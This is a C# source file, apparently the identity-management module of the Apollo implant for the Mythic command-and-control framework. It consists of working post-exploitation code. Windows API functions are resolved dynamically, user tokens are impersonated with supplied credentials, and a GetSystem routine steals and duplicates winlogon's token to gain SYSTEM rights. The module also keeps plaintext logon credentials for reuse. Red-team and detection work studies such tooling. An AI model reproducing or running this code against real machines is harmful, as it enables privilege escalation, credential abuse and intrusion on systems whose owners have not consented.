using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static ApolloInterop.Constants.Win32;
using static ApolloInterop.Enums.Win32;
using static ApolloInterop.Structs.Win32;

namespace Apollo.Management.Identity;

public class IdentityManager : IIdentityManager
{
    private readonly IAgent _agent;
    private readonly object _identitySync = new();

    private ApolloLogonInformation _userCredential;
    private WindowsIdentity _originalIdentity;
    private WindowsIdentity _currentPrimaryIdentity;
    private WindowsIdentity _currentImpersonationIdentity;
    private bool _isImpersonating;

    private IntPtr _executingThread = IntPtr.Zero;
    private IntPtr _originalImpersonationToken = IntPtr.Zero;
    private IntPtr _originalPrimaryToken = IntPtr.Zero;

    #region Delegate Typedefs

    private delegate IntPtr GetCurrentThread();

    private delegate bool OpenThreadToken(
        IntPtr threadHandle,
        uint desiredAccess,
        bool openAsSelf,
        out IntPtr tokenHandle);

    private delegate bool OpenProcessToken(
        IntPtr hProcess,
        uint dwDesiredAccess,
        out IntPtr hToken);

    private delegate bool DuplicateTokenEx(
        IntPtr hToken,
        TokenAccessLevels dwDesiredAccess,
        IntPtr lpTokenAttributes,
        TokenImpersonationLevel impersonationLevel,
        TokenType tokenType,
        out IntPtr phNewToken);

    private delegate bool SetThreadToken(
        ref IntPtr hThread,
        IntPtr hToken);

    private delegate bool CloseHandle(IntPtr hHandle);

    private delegate bool GetTokenInformation(
        IntPtr tokenHandle,
        TokenInformationClass tokenInformationClass,
        IntPtr tokenInformation,
        int tokenInformationLength,
        out int returnLength);

    private delegate IntPtr GetSidSubAuthorityCount(IntPtr pSid);
    private delegate IntPtr GetSidSubAuthority(IntPtr pSid, int nSubAuthority);

    [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Unicode)]
    private delegate bool LogonUserW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpszUsername,
        [MarshalAs(UnmanagedType.LPWStr)] string lpszDomain,
        [MarshalAs(UnmanagedType.LPWStr)] string lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken);

    private readonly GetCurrentThread _GetCurrentThread;
    private readonly OpenThreadToken _OpenThreadToken;
    private readonly OpenProcessToken _OpenProcessToken;
    private readonly DuplicateTokenEx _DuplicateTokenEx;
    private readonly SetThreadToken _SetThreadToken;
    private readonly CloseHandle _CloseHandle;
    private readonly GetTokenInformation _GetTokenInformation;
    private readonly GetSidSubAuthorityCount _GetSidSubAuthorityCount;
    private readonly GetSidSubAuthority _GetSidSubAuthority;

    private readonly LogonUserW _pLogonUserW;

    #endregion

    public IdentityManager(IAgent agent)
    {
        _agent = agent;

        _GetCurrentThread = _agent.GetApi().GetLibraryFunction<GetCurrentThread>(Library.KERNEL32, "GetCurrentThread");
        _OpenThreadToken = _agent.GetApi().GetLibraryFunction<OpenThreadToken>(Library.ADVAPI32, "OpenThreadToken");
        _OpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
        _DuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
        _SetThreadToken = _agent.GetApi().GetLibraryFunction<SetThreadToken>(Library.ADVAPI32, "SetThreadToken");
        _CloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
        _GetTokenInformation = _agent.GetApi().GetLibraryFunction<GetTokenInformation>(Library.ADVAPI32, "GetTokenInformation");
        _GetSidSubAuthorityCount = _agent.GetApi().GetLibraryFunction<GetSidSubAuthorityCount>(Library.ADVAPI32, "GetSidSubAuthorityCount");
        _GetSidSubAuthority = _agent.GetApi().GetLibraryFunction<GetSidSubAuthority>(Library.ADVAPI32, "GetSidSubAuthority");
        _pLogonUserW = _agent.GetApi().GetLibraryFunction<LogonUserW>(Library.ADVAPI32, "LogonUserW");

        _originalIdentity = WindowsIdentity.GetCurrent();
        _currentPrimaryIdentity = _originalIdentity;
        _currentImpersonationIdentity = _originalIdentity;
        _isImpersonating = false;
        _userCredential = new ApolloLogonInformation();

        _executingThread = _GetCurrentThread();
        SetImpersonationToken();
        SetPrimaryToken();
    }

    private void SetPrimaryToken()
    {
        bool bRet = _OpenThreadToken(
            _executingThread,
            TOKEN_ALL_ACCESS,
            true,
            out _originalPrimaryToken);

        int dwError = Marshal.GetLastWin32Error();

        if (!bRet)
        {
            if (dwError == Error.ERROR_NO_TOKEN)
            {
                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
                bRet = _OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out _originalPrimaryToken);
                if (!bRet)
                    throw new Exception($"Failed to open process token: {Marshal.GetLastWin32Error()}");
            }
            else
            {
                throw new Exception($"Failed to open thread token: {dwError}");
            }
        }

        if (_originalPrimaryToken == IntPtr.Zero)
            _originalPrimaryToken = _originalIdentity.Token;
    }

    private void SetImpersonationToken()
    {
        bool bRet = _OpenThreadToken(
            _executingThread,
            TOKEN_ALL_ACCESS,
            true,
            out IntPtr hToken);

        int dwError = Marshal.GetLastWin32Error();

        if (!bRet)
        {
            if (dwError == Error.ERROR_NO_TOKEN)
            {
                IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
                bRet = _OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken);
                if (!bRet)
                    throw new Exception($"Failed to acquire process token: {Marshal.GetLastWin32Error()}");
            }
            else
            {
                throw new Exception($"Failed to open thread token: {dwError}");
            }
        }

        bRet = _DuplicateTokenEx(
            hToken,
            TokenAccessLevels.MaximumAllowed,
            IntPtr.Zero,
            TokenImpersonationLevel.Impersonation,
            TokenType.TokenImpersonation,
            out _originalImpersonationToken);

        _CloseHandle(hToken);

        if (!bRet)
            throw new Exception($"Failed to duplicate impersonation token: {Marshal.GetLastWin32Error()}");

        if (_originalImpersonationToken == IntPtr.Zero)
            _originalImpersonationToken = _originalIdentity.Token;
    }

    private void RevertInternal()
    {
        if (!_SetThreadToken(ref _executingThread, _originalImpersonationToken))
        {
            DebugHelp.DebugWriteLine($"[!] Revert() failed to restore thread token: {Marshal.GetLastWin32Error()}");
        }

        _userCredential = new ApolloLogonInformation();
        _currentImpersonationIdentity = _originalIdentity;
        _currentPrimaryIdentity = _originalIdentity;
        _isImpersonating = false;
    }

    public bool IsOriginalIdentity()
    {
        lock (_identitySync)
        {
            return !_isImpersonating;
        }
    }

    public bool GetSystem()
    {
        lock (_identitySync)
        {
            if (GetIntegrityLevel() is not IntegrityLevel.HighIntegrity)
                return false;

            IntPtr hToken = IntPtr.Zero;
            IntPtr hDupToken = IntPtr.Zero;

            try
            {
                System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
                if (processes.Length == 0)
                    return false;

                IntPtr handle = processes[0].Handle;
                bool success = _OpenProcessToken(
                    handle,
                    (uint)(TokenAccessLevels.Query | TokenAccessLevels.Duplicate),
                    out hToken);

                if (!success)
                {
                    DebugHelp.DebugWriteLine("[!] GetSystem() - OpenProcessToken failed!");
                    return false;
                }

                success = _DuplicateTokenEx(
                    hToken,
                    TokenAccessLevels.MaximumAllowed,
                    IntPtr.Zero,
                    TokenImpersonationLevel.Impersonation,
                    TokenType.TokenImpersonation,
                    out hDupToken);

                if (!success)
                {
                    DebugHelp.DebugWriteLine("[!] GetSystem() - DuplicateTokenEx failed!");
                    return false;
                }

                DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
                SetImpersonationIdentity(hDupToken);
                SetPrimaryIdentity(hDupToken);
                return true;
            }
            finally
            {
                if (hToken != IntPtr.Zero)
                    _CloseHandle(hToken);
                if (hDupToken != IntPtr.Zero)
                    _CloseHandle(hDupToken);
            }
        }
    }

    public IntegrityLevel GetIntegrityLevel()
    {
        IntPtr hToken;

        lock (_identitySync)
        {
            hToken = _currentImpersonationIdentity.Token;
        }

        int dwRet = 0;
        int dwTokenInfoLength = 0;
        IntPtr pTokenLabel = IntPtr.Zero;

        _GetTokenInformation(
            hToken,
            TokenInformationClass.TokenIntegrityLevel,
            IntPtr.Zero,
            0,
            out dwTokenInfoLength);

        if (dwTokenInfoLength == 0 || Marshal.GetLastWin32Error() != Error.ERROR_INSUFFICIENT_BUFFER)
            return (IntegrityLevel)dwRet;

        pTokenLabel = Marshal.AllocHGlobal(dwTokenInfoLength);

        try
        {
            bool bRet = _GetTokenInformation(
                hToken,
                TokenInformationClass.TokenIntegrityLevel,
                pTokenLabel,
                dwTokenInfoLength,
                out dwTokenInfoLength);

            if (bRet)
            {
                TokenMandatoryLevel tokenLabel = (TokenMandatoryLevel)Marshal.PtrToStructure(pTokenLabel, typeof(TokenMandatoryLevel));
                IntPtr pSidSubAuthorityCount = _GetSidSubAuthorityCount(tokenLabel.Label.Sid);
                int subAuthorityCount = Marshal.ReadByte(pSidSubAuthorityCount);

                if (subAuthorityCount > 0)
                {
                    dwRet = Marshal.ReadInt32(_GetSidSubAuthority(tokenLabel.Label.Sid, subAuthorityCount - 1));
                }

                if (dwRet < SECURITY_MANDATORY_LOW_RID)
                    dwRet = 0;
                else if (dwRet < SECURITY_MANDATORY_MEDIUM_RID)
                    dwRet = 1;
                else if (dwRet < SECURITY_MANDATORY_HIGH_RID)
                    dwRet = 2;
                else if (dwRet < SECURITY_MANDATORY_SYSTEM_RID)
                    dwRet = 3;
                else
                    dwRet = 4;
            }
        }
        catch (Exception ex)
        {
            DebugHelp.DebugWriteLine($"[!] GetIntegrityLevel() failed: {ex.Message}");
        }
        finally
        {
            Marshal.FreeHGlobal(pTokenLabel);
        }

        return (IntegrityLevel)dwRet;
    }

    public WindowsIdentity GetCurrent()
    {
        lock (_identitySync)
        {
            return _currentImpersonationIdentity;
        }
    }

    public WindowsIdentity GetOriginal()
    {
        lock (_identitySync)
        {
            return _originalIdentity;
        }
    }

    public bool SetIdentity(ApolloLogonInformation logonInfo)
    {
        lock (_identitySync)
        {
            RevertInternal();

            bool bRet = _pLogonUserW(
                logonInfo.Username,
                logonInfo.Domain,
                logonInfo.Password,
                logonInfo.NetOnly ? LogonType.LOGON32_LOGON_NEW_CREDENTIALS : LogonType.LOGON32_LOGON_INTERACTIVE,
                LogonProvider.LOGON32_PROVIDER_WINNT50,
                out IntPtr hToken);

            if (!bRet)
            {
                return false;
            }

            _currentPrimaryIdentity = new WindowsIdentity(hToken);

            bRet = _DuplicateTokenEx(
                _currentPrimaryIdentity.Token,
                TokenAccessLevels.MaximumAllowed,
                IntPtr.Zero,
                TokenImpersonationLevel.Impersonation,
                TokenType.TokenImpersonation,
                out IntPtr dupToken);

            if (!bRet)
            {
                _CloseHandle(hToken);
                RevertInternal();
                return false;
            }

            _currentImpersonationIdentity = new WindowsIdentity(dupToken);
            _isImpersonating = true;
            _userCredential = logonInfo;

            _CloseHandle(hToken);
            _CloseHandle(dupToken);

            return true;
        }
    }

    public void SetPrimaryIdentity(WindowsIdentity ident)
    {
        lock (_identitySync)
        {
            _currentPrimaryIdentity = ident;
            _isImpersonating = true;
        }
    }

    public void SetPrimaryIdentity(IntPtr hToken)
    {
        lock (_identitySync)
        {
            _currentPrimaryIdentity = new WindowsIdentity(hToken);
            _isImpersonating = true;
        }
    }

    public void SetImpersonationIdentity(WindowsIdentity ident)
    {
        lock (_identitySync)
        {
            _currentImpersonationIdentity = ident;
            _isImpersonating = true;
        }
    }

    public void SetImpersonationIdentity(IntPtr hToken)
    {
        lock (_identitySync)
        {
            _currentImpersonationIdentity = new WindowsIdentity(hToken);
            _isImpersonating = true;
        }
    }

    public void Revert()
    {
        lock (_identitySync)
        {
            RevertInternal();
        }
    }

    public WindowsIdentity GetCurrentPrimaryIdentity()
    {
        lock (_identitySync)
        {
            return _currentPrimaryIdentity;
        }
    }

    public WindowsIdentity GetCurrentImpersonationIdentity()
    {
        lock (_identitySync)
        {
            return _currentImpersonationIdentity;
        }
    }

    public bool GetCurrentLogonInformation(out ApolloLogonInformation logonInfo)
    {
        lock (_identitySync)
        {
            if (!string.IsNullOrEmpty(_userCredential.Username) &&
                !string.IsNullOrEmpty(_userCredential.Password))
            {
                logonInfo = _userCredential;
                return true;
            }

            logonInfo = new ApolloLogonInformation();
            return false;
        }
    }
}
